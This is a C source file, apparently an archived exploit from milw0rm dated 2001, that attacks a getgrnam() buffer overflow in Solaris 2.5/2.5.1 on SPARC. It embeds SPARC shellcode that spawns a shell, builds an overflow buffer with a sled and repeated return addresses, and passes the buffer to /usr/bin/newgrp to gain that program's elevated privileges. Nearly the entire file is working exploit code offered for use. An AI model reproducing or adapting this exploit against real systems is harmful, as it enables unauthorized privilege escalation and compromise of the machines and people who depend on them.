#include <stdio.h>
#include <sys/types.h>

/*
   getgrnam() function overflow.

   works against Solaris 2.5/2.5.1 (SPARC)
   default offset should work.

   Pablo Sor, Buenos Aires, Argentina.
   psor@afip.gov.ar

*/

u_char shell[] =
  "\x82\x10\x20\xca\xa6\x1c\xc0\x13\x90\x0c\xc0\x13\x92\x0c\xc0\x13"
  "\xa6\x04\xe0\x01\x91\xd4\xff\xff\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
  "\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1a\x80\x0a"
  "\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
  "\x82\x10\x20\x3b\x91\xd4\xff\xff";

u_long get_sp(void)
{
  __asm__("mov %sp,%i0 \n");
}

void main()
{
  long *p;
  long addr;
  char buf[8300];
  int i;

  addr = get_sp()-8096;
  printf("Jumping to address %p\n",addr);
  p = (long *) buf;
  for (i=0;i<2050;++i) *(p++) = 0xa61cc013;
  for (i=0;i<strlen(shell);++i) buf[104+i] = shell[i];
  p = (long *) &buf[8160];
  for (i=0;i<30;++i) *(p++) = addr;
  buf[8280]=0;
  execl("/usr/bin/newgrp","newgrp",buf,(char *)0);
}


// milw0rm.com [2001-01-13]
